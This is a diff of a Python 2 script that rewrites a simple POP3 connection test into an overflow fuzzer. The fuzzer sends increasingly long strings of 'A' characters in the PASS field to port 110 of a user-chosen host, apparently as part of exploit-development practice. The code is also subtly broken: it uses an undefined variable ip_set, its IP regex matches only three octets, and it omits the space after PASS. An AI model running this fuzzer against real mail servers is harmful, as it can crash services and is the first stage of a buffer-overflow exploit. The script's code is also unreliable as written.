@@ -1,18 +1,36 @@
 #!/usr/bin/python
 
 import socket
+import re
 
-ip = input("What IP adddress would you like to connect to: \n")
-port = input("What port would you like to connect to: \n")
+ip = raw_input("What IP adddress would you like to connect to: \n")
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+buffer=["A"]
+counter=100
 
-try:
-    print "\nConnection evil buffer..."
-    sock.connect((ip, port))
-    data = sock.recv(1024)
-    print data
+while len(buffer) <= 30:
+    buffer.append("A" * counter)
+    counter=counter + 200
 
-except:
-    print "Could not connect to POP3!"
+uname = raw_input("What username would you like to connect to the POP3 server using?: \n")
+
+prog = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}$")
+
+if prog.match(ip_set):
+
+    try:
+        for i in buffer:    
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+            sock.connect((ip, 110))
+            print "\nConnecting to POP3 port"
+            data = sock.recv(1024)
+            print data
+            sock.send("USER " + uname + '\r\n')
+            data = sock.recv(1024)
+            print "%s bytes sent to pass field" % len(i)
+            sock.send("PASS" + i + '\r\n')
+            sock.send('QUIT\r\n')
+            sock.close()
+    except:
+        print "Could not connect to POP3!"
 
